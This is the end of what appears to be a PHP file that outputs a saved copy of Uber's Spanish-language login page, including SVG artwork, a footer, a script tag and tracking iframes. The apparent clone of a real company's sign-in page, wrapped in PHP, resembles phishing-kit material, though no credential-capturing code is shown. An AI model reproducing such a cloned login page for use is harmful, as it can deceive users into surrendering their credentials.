data-reactid="218"><path fill="none" d="M0 0h5v5H0z" data-reactid="219"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="220"></path><path fill="none" d="M0 0h5v5H0V0z" data-reactid="221"></path><path d="M2 2H0V0h2v2z" data-reactid="222"></path></pattern><pattern id="b" data-name="SVGID 1" width="5" height="5" patternTransform="translate(841.4 310.4)" patternUnits="userSpaceOnUse" viewBox="0 0 5 5" data-reactid="223"><path fill="none" d="M0 0h5v5H0z" data-reactid="224"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="225"></path><path fill="none" d="M0 0h5v5H0V0z" data-reactid="226"></path><path d="M2 2H0V0h2v2z" data-reactid="227"></path></pattern><pattern id="c" data-name="2 3 - black" width="5" height="5" patternTransform="translate(726 30)" patternUnits="userSpaceOnUse" viewBox="0 0 5 5" data-reactid="228"><path fill="none" d="M0 0h5v5H0z" data-reactid="229"></path><path fill="none" d="M0 0h5v5H0z" data-reactid="230"></path><path fill="none" d="M0 0h5v5H0V0z" data-reactid="231"></path><path d="M2 2H0V0h2v2z" data-reactid="232"></path></pattern></defs><path d="M1498.22 54H1361.5a5.5 5.5 0 0 1 0-11h50.6a23.92 23.92 0 0 0 16.9-7 23.92 23.92 0 0 1 16.9-7h19.33a194.76 194.76 0 0 0-100.59-28H1137c-11.9 0-23.2 3.9-32 12a49.47 49.47 0 0 1-32.8 13H969.9c-22.3 0-43.1 7.5-58.9 22s-37.7 23-60 23H720a137.73 137.73 0 0 0-94 37c-26.1 24.4-61.8 38-98.9 38H510c-26.2 0-50.7 10.2-70 28l-26 23h1146a195.13 195.13 0 0 0-61.78-143zM1297 66a17 17 0 1 1 17-17 17 17 0 0 1-17 17zm162 34h-112a5 5 0 0 1 0-10h15.3a30.48 30.48 0 0 0 21.7-9 30.66 30.66 0 0 1 21.7-9h53.3a14 14 0 0 1 0 28z" fill="#1A3177" data-reactid="233"></path><path d="M1536 173a148 148 0 0 0-104-43h-111v67h239zm-613-21h-17v-38a73.89 73.89 0 0 0 17-2v40zm271-80a125.64 125.64 0 0 1 90 37.2V153h-90V72zm-172-1v14l-14-14h14zM574 197h-45c16.4 0 31.9-5.6 45-15v15z" data-reactid="234"></path><path fill="#fff" d="M840 32v9h-10v156h48V42h5V32h-43zm115 120h-67l45 45h22v-45zm-32-61h32v61h-32z" data-reactid="235"></path><path fill="#d6d6d6" d="M928 98h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27zm0 6h27v2h-27z" data-reactid="236"></path><path fill="#fff" d="M932 85h36v6h-36z" data-reactid="237"></path><path fill="#89DAC1" d="M932 85l19-19h17v19h-36z" data-reactid="238"></path><path fill="#5879DA" d="M1022 85l-19-19h-35v19h54z" data-reactid="239"></path><path fill="#89DAC1" d="M979 79v-6h-6l6 6zm13 0v-6h-6l6 6zm13 0v-6h-6l6 6z" data-reactid="240"></path><path fill="#fff" d="M951 63h17v3h-17zm104 107l-55-55h55v55z" data-reactid="241"></path><path fill="#d6d6d6" d="M1045 121h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-14 1l-1-1h1v1zm8 6h-1l-1-1v-6h2v7z" data-reactid="242"></path><path fill="#5879DA" d="M679 140h21v8h-21zm0-14h21v8h-21zm0-14h21v8h-21zm0-14v8h24l-8-8h-16z" data-reactid="243"></path><path fill="#d6d6d6" d="M679 134h21v6h-21zm0-14h21v6h-21zm0-14h17v6h-17z" data-reactid="244"></path><path fill="#89DAC1" d="M679 140v8h-55l8-8h47zm0-14v8h-44l8-8h36zm0-14v8h-35l8-8h27zm0-14v8h-25l8-8h17z" data-reactid="245"></path><path fill="#fff" d="M643 134h36v6h-36zm9-14h27v6h-27zm10-14h17v6h-17zm634 87l-40-40h-10v-38h50v78z" data-reactid="246"></path><path fill="#5879DA" d="M1296 107v8h26l-8-8h-18z" data-reactid="247"></path><path fill="#89DAC1" d="M1296 107v8h-50l8.4-8h41.6z" data-reactid="248"></path><path fill="#d6d6d6" d="M1290 120h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm40 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm40 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-494 16h74v35h-74z" data-reactid="249"></path><path fill="url(#a)" d="M756 162h74v35h-74z" data-reactid="250"></path><path d="M756 32v48h-17v6h-25a14 14 0 0 0-14 14v97h56V86h32V0zm212 17h2v14h-2z" fill="#fff" data-reactid="251"></path><path fill="#5879DA" d="M970 49h6v2h-6z" data-reactid="252"></path><path fill="#fff" d="M985 49h2v14h-2z" data-reactid="253"></path><path fill="#5879DA" d="M987 49h6v2h-6z" data-reactid="254"></path><path fill="#fff" d="M1001 49h2v14h-2z" data-reactid="255"></path><path fill="#5879DA" d="M1003 49h6v2h-6z" data-reactid="256"></path><path fill="#d6d6d6" d="M749 167h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm155-28h18V42h-5V32h-18v10h-5v155h55l-45-45z" data-reactid="257"></path><path fill="url(#b)" d="M603 148h41v49h-41z" data-reactid="258"></path><path fill="#d6d6d6" d="M603 148v49h97v-49h-97zM840 18h2v14h-2zm6 0h2v14h-2z" data-reactid="259"></path><path d="M1045 13a13.38 13.38 0 0 0-13 13h26a13.38 13.38 0 0 0-13-13z" fill="#89DAC1" data-reactid="260"></path><path d="M1045 13v13h13a13.38 13.38 0 0 0-13-13z" fill="#5879DA" data-reactid="261"></path><path fill="#fff" d="M1047 111V29h-2v-3h-20v3h-3v82h25z" data-reactid="262"></path><path fill="#d6d6d6" d="M1041 34h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm-5-44h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm-5-44h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm-5-44h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2zm0 11h2v7h-2z" data-reactid="263"></path><path fill="#fff" d="M1142 38h26v100h-26z" data-reactid="264"></path><path d="M1194 138h-26V38a26 26 0 0 1 26 26v74z" fill="#d6d6d6" data-reactid="265"></path><path fill="#fff" d="M1123 153h61v44h-61z" data-reactid="266"></path><path fill="#d6d6d6" d="M1184 153h72v44h-72z" data-reactid="267"></path><path d="M1199 166a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3zm14 0a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3zm14 0a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3zm14 0a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3z" fill="#5879DA" data-reactid="268"></path><path d="M1145 166a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3zm14 0a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3zm14 0a3 3 0 0 0-3 3v28h6v-28a3 3 0 0 0-3-3z" fill="#d6d6d6" data-reactid="269"></path><path d="M727 162v-4h5a17.39 17.39 0 0 0 12-5l2-2h10v11h-29z" fill="#89DAC1" data-reactid="270"></path><path d="M830 162v-4h-4c-4.6 0-9.8-1.8-13-5l-2-2h-55v11h74zm354-9h72a50.17 50.17 0 0 0-36-15 50.83 50.83 0 0 0-36 15z" fill="#5879DA" data-reactid="271"></path><path fill="#d6d6d6" d="M1300 197l-44-44v44h44zM1142 68h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26z" data-reactid="272"></path><path fill="#5879DA" d="M1168 68h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26zm0 6h26v2h-26z" data-reactid="273"></path><path d="M1168 41v26h26a26.08 26.08 0 0 0-26-26z" transform="translate(0 -3)" fill="url(#c)" data-reactid="274"></path><path fill="#d6d6d6" d="M1335 162h35v35h-35z" data-reactid="275"></path><path fill="url(#a)" d="M1335 162h35v35h-35z" data-reactid="276"></path><path fill="#89DAC1" d="M1335 162h-26l13-13 13 13z" data-reactid="277"></path><path fill="#5879DA" d="M1357 149h-35l13 13h35l-13-13zm-493 30v2a5.06 5.06 0 0 1-1.7 3.3l-2 2-.3.3V179h-2v18h2v-5.5a6.29 6.29 0 0 1 1.7-3.8l2-2a7 7 0 0 0 2.3-4.7v-2h-2zm77 7h2v11h-2zm-227 0h2v11h-2z" data-reactid="278"></path><path fill="#d6d6d6" d="M968 63h35v3h-35z" data-reactid="279"></path><path d="M490 197a42.44 42.44 0 0 1-30.5-12.9C449.6 174.2 436 168 422 168h-38c-8 0-15.3-2.3-21-8a31.79 31.79 0 0 0-22-9h-80a41.11 41.11 0 0 1-29-12 41.11 41.11 0 0 0-29-12H100a72.29 72.29 0 0 0-51 21L0 197h490z" data-reactid="280"></path><path d="M1297 27a22 22 0 1 0 22 22 22 22 0 0 0-22-22zm0 39a17 17 0 1 1 17-17 17 17 0 0 1-17 17z" fill="#1A3177" data-reactid="281"></path><path fill="#5879DA" d="M647 151v32h2v-30l-2-2zm8 8v24h2v-22l-2-2zm8 8v16h2v-14l-2-2zm8 8v8h2v-6l-2-2z" data-reactid="282"></path><path d="M603 148h-17.8a11.18 11.18 0 0 0-11.2 11.16V197h29v-49z" fill="#fff" data-reactid="283"></path><path fill="#5879DA" d="M685 151h2v32h-2zm7 0h2v32h-2zM883 48h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm-11 6h7v2h-7zm11 0h7v2h-7zm229-6h19v15h-19z" data-reactid="284"></path><path d="M1220 138h-78v15h42a50.83 50.83 0 0 1 36-15z" fill="#89DAC1" data-reactid="285"></path><path fill="#d6d6d6" d="M1335 173h-13v-58h-26v82h39v-24z" data-reactid="286"></path><path fill="#5879DA" d="M1316 120h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2z" data-reactid="287"></path><path d="M826 158h4v-44h-12v42.3a20.53 20.53 0 0 0 8 1.7z" data-reactid="288"></path><path d="M813 153a16.56 16.56 0 0 0 4.3 3h.7V0h-30v86h-32v65h55zm-99-60h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42zm0 6h42v2h-42z" fill="#d6d6d6" data-reactid="289"></path><path fill="#5879DA" d="M756 93h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zm0 6h34v2h-34zM796 0h2v137h-2zm6 0h2v137h-2zm6 0h2v137h-2z" data-reactid="290"></path><path fill="#fff" d="M644 148h35v35l-35-35z" data-reactid="291"></path><path fill="#d6d6d6" d="M649 153v-2h-2l2 2zm8 8v-10h-2v8l2 2zm8 8v-18h-2v16l2 2zm8 8v-26h-2v24l2 2z" data-reactid="292"></path><path d="M1123 72h19v66h-19z" data-reactid="293"></path><path fill="#d6d6d6" d="M1062 29v-3h-17v3h2v80l-18-18h-7v-6h-54v6h-13v106h100v-27l-55-55h65V29h-3z" data-reactid="294"></path><path fill="#5879DA" d="M1060 34h2v7h-2zm0 11h2v7h-2zm-5-11h2v7h-2zm0 11h2v7h-2zm-5-11h2v7h-2zm0 11h2v7h-2zm-95 53h74v2h-74zm0 6h74v2h-74zm0 6h74v2h-74zm0 6h45v2h-45zm0 6h45v2h-45zm0 6h45v2h-45zm0 6h45v2h-45zm0 6h45v2h-45z" data-reactid="295"></path><path d="M1024.3 158.6a2 2 0 0 0-3.3 1.4v11l-12.7-12.4a2 2 0 0 0-3.3 1.4v11l-12.7-12.4a2 2 0 0 0-3.3 1.4v11l-12.7-12.4a2 2 0 0 0-3.3 1.4v37h64v-26z" fill="#fff" data-reactid="296"></path><path fill="#d6d6d6" d="M977 177h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm-33 6h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm-33 6h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7zm11 0h7v2h-7z" data-reactid="297"></path><path fill="#5879DA" d="M1043 177h7v2h-7zm0 6h7v2h-7zm0 6h7v2h-7z" data-reactid="298"></path><path fill="#d6d6d6" d="M1021 147h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2z" data-reactid="299"></path><path fill="#5879DA" d="M1029 147h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2z" data-reactid="300"></path><path fill="#d6d6d6" d="M1013 134h2v7h-2zm-8 0h2v7h-2z" data-reactid="301"></path><path fill="#5879DA" d="M1013 134h2v7h-2zm-8 0h2v7h-2zm0-13v7h2v-6l-1-1h-1z" data-reactid="302"></path><path fill="#d6d6d6" d="M1021 121h2v7h-2zm-8 0h2v7h-2zm10 20l-2-2v-5h2v7z" data-reactid="303"></path><path fill="#5879DA" d="M1039 154h-2v-2l2 2z" data-reactid="304"></path><path fill="url(#a)" d="M603 148h41v49h-41z" data-reactid="305"></path><path fill="#fff" d="M1335 162h-26l26 26v-26z" data-reactid="306"></path><path fill="#89DAC1" d="M1335 162h-26l13-13 13 13z" data-reactid="307"></path><path fill="#d6d6d6" d="M1329 166h2v7h-2zm-8 0h2v7h-2z" data-reactid="308"></path><path d="M1293 197c6.2 0 13.6-2.6 18-7a28 28 0 0 1 20-8h20a17.84 17.84 0 0 0 12-5c2-2 4.4-4.2 7-5v25h-77z" data-reactid="309"></path><path fill="#5879DA" d="M1023 141h-2v-5l2 2v3z" data-reactid="310"></path><path d="M718.5 186h-10a3.54 3.54 0 0 1-3.5-3.5 3.54 3.54 0 0 1 3.5-3.5h1.1a3.49 3.49 0 0 0 2.4-1 3.49 3.49 0 0 1 2.4-1h4.1a4.48 4.48 0 0 1 4.5 4.46 4.48 4.48 0 0 1-4.46 4.5zM848 175.5a3.54 3.54 0 0 1 3.5-3.5 6 6 0 0 0 4.3-1.8l.2-.2a6.73 6.73 0 0 1 4.8-2h7.7a5.55 5.55 0 0 1 5.5 5.5 5.55 5.55 0 0 1-5.5 5.5h-17a3.54 3.54 0 0 1-3.5-3.5zm88.5 10.5H948a3 3 0 0 0 3-3 3 3 0 0 0-3-3h-.9a4.91 4.91 0 0 1-3.6-1.5 5.07 5.07 0 0 0-3.6-1.5h-3.4a4.4 4.4 0 0 0-4.4 4.4v.1a4.34 4.34 0 0 0 4.18 4.5h.22z" fill="#89DAC1" data-reactid="311"></path><path fill="#d6d6d6" d="M1007 122l-1-1h1v1z" data-reactid="312"></path><path d="M1099 50h-24a19.93 19.93 0 0 0-20 19.86V197h44V50z" fill="#fff" data-reactid="313"></path><path fill="#d6d6d6" d="M1072 58h2v57h-2zm7 0h2v57h-2zm9 63l-2-2V58h2v63zm7 7l-2-2V58h2v70z" data-reactid="314"></path><path fill="#d6d6d6" d="M1123 153V50h-24v81l-16-16h-28v82h112l-44-44z" data-reactid="315"></path><path fill="#5879DA" d="M1088 151h-2v-33l2 2v31zm7 0h-2v-26l2 2v24zm-17-30h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm16 13h2v7h-2zm-8 0h2v7h-2zm-8 0h2v7h-2zm20 32v2a5.06 5.06 0 0 1-1.7 3.3l-2 2-.3.3V179h-2v18h2v-5a7.43 7.43 0 0 1 1.7-4.3l2-2a7 7 0 0 0 2.3-4.7v-2h-2z" data-reactid="316"></path><path d="M1066 175.6a3.46 3.46 0 0 1 3.5-3.4h1.2a4 4 0 0 0 2.5-1l2.2-2.1a3.74 3.74 0 0 1 2.5-1h8.6a5.57 5.57 0 0 1 5.6 5.5 5.57 5.57 0 0 1-5.6 5.5h-16.9a3.63 3.63 0 0 1-3.6-3.5z" fill="#fff" data-reactid="317"></path><path fill="#5879DA" d="M1106 186h2v11h-2z" data-reactid="318"></path><path d="M1101.5 186h11.5a3 3 0 0 0 3-3 3 3 0 0 0-3-3h-.9a4.91 4.91 0 0 1-3.6-1.5 5.08 5.08 0 0 0-3.6-1.5h-3.4a4.4 4.4 0 0 0-4.4 4.4v.1a4.34 4.34 0 0 0 4.18 4.5h.22z" fill="#fff" data-reactid="319"></path><path fill="#5879DA" d="M1106 58h2v93h-2zm7 0h2v93h-2z" data-reactid="320"></path><path d="M1297 20a32 32 0 1 0 32 32 32 32 0 0 0-32-32zm0 49a17 17 0 1 1 17-17 17 17 0 0 1-17 17z" transform="translate(0 -3)" fill="url(#c)" data-reactid="321"></path></svg></div></div><div class="app-footer text-white bg-uber-black pull-app-gutter--sides soft-app-gutter--sides" data-reactid="322"><div class="desk-wrapper soft-small--top palm-soft-huge--top" data-reactid="323"><div class="layout soft--right" data-reactid="324"><div class="layout__item one-whole" data-reactid="325"><a href="/login" data-reactid="326"><i class="bit--logo__logo icon icon_uber" data-reactid="327"></i></a></div><div class="layout layout__item soft-small--top" data-reactid="328"><div class="legal one-whole footer-border" data-reactid="329"><div class="one-half float--left soft-small--ends" data-reactid="330">© 2017 Uber Technologies Inc.</div><div class="one-half float--right text--right soft-small--ends" data-reactid="331"><a href="https://www.uber.com/legal/privacy/users/en/" class="white-link" data-reactid="332"><!-- react-text: 333 -->Política de privacidad<!-- /react-text --><!-- react-text: 334 --> <!-- /react-text --></a><!-- react-text: 335 -->&nbsp;| &nbsp;<!-- /react-text --><a href="https://www.uber.com/legal/terms/us/" class="white-link" data-reactid="336">Términos y condiciones</a></div></div></div></div></div></div></footer><script src="https://d1a3f4spazzrp4.cloudfront.net/arch-frontend/1.0.0/d1a3f4spazzrp4.cloudfront.net/javascripts/main-9ec7d553f1.js" data-reactid="337"></script></div></div>
    

<div id="fb-root" class=" fb_reset"><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div><iframe name="fb_xdm_frame_https" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" id="fb_xdm_frame_https" aria-hidden="true" title="Facebook Cross Domain Communication Frame" tabindex="-1" src="https://staticxx.facebook.com/connect/xd_arbiter/r/lY4eZXm_YWu.js?version=42#channel=f298cd314668c4c&amp;origin=https%3A%2F%2Fauth.uber.com" style="border: none;"></iframe></div></div><div style="position: absolute; top: -10000px; height: 0px; width: 0px;"><div></div></div></div><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_uber_0" src="https://uber.demdex.net/dest5.html?d_nsid=0#https%3A%2F%2Fauth.uber.com%2Flogin%2F%3Fnext_url%3Dhttps%253A%252F%252Fpartners.uber.com" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe></body></html>
<?php
	}
?>